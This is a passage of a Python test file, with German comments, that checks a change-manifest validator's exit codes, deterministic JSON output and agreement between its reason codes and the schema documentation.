        assert validator.main([str(manifest), "--repo-root", str(REPO_ROOT)]) == 1

    def test_cli_returns_one_on_finding(self, tmp_path):
        data = minimal_annex_manifest()
        data["focus"] = "Einwort"
        manifest = self._write(tmp_path, data)
        assert validator.main([str(manifest), "--repo-root", str(REPO_ROOT)]) == 1

    def test_cli_returns_two_on_unparseable_yaml(self, tmp_path):
        """Dokumentierte Semantik: Parsefehler ist ein Eingabefehler, nicht Befund."""
        manifest = tmp_path / "broken.yaml"
        manifest.write_text("focus: [unclosed\n  - :: bad", encoding="utf-8")
        assert validator.main([str(manifest), "--repo-root", str(REPO_ROOT)]) == 2

    def test_cli_returns_two_on_unreadable_input(self, tmp_path):
        assert validator.main([str(tmp_path / "missing.yaml")]) == 2

    def test_cli_json_output_is_deterministic(self, tmp_path, capsys):
        manifest = self._write(tmp_path, minimal_annex_manifest())
        argv = [str(manifest), "--json", "--repo-root", str(REPO_ROOT)]
        assert validator.main(argv) == 0
        first = capsys.readouterr().out
        assert validator.main(argv) == 0
        assert capsys.readouterr().out == first
        payload = json.loads(first)
        assert payload["verdict"] == validator.VERDICT_ELIGIBLE
        assert payload["schema"] == validator.SCHEMA_ID

    def test_documented_exit_codes_match_the_module_docstring(self):
        doc = VALIDATOR_PATH.read_text(encoding="utf-8")
        assert "2  Eingabefehler" in doc
        assert "YAML nicht parsebar" in doc

    def test_every_reason_code_is_documented_in_the_schema(self):
        """Struktur-Zahl gegen Realität: kein Code ohne Tabelleneintrag."""
        schema = (SKILL_DIR / "references" / "change-manifest-schema.md").read_text(
            encoding="utf-8"
        )
        for code in reason_code_names():
            assert f"`{code}`" in schema, f"{code} fehlt in der Reason-Code-Tabelle"

    def test_documented_reason_code_count_matches_the_code(self):
        schema = (SKILL_DIR / "references" / "change-manifest-schema.md").read_text(
            encoding="utf-8"
        )
        count = len(reason_code_names())
        assert (
            f"{count} Reason-Codes" in schema
        ), f"Schema nennt nicht die tatsächliche Zahl {count}"

    def test_skill_files_exist(self):
        for relative in (
            "SKILL.md",
            "references/change-manifest-schema.md",
            "templates/change-manifest.yaml",
            "scripts/validate_change_manifest.py",
        ):
            assert (SKILL_DIR / relative).exists(), relative
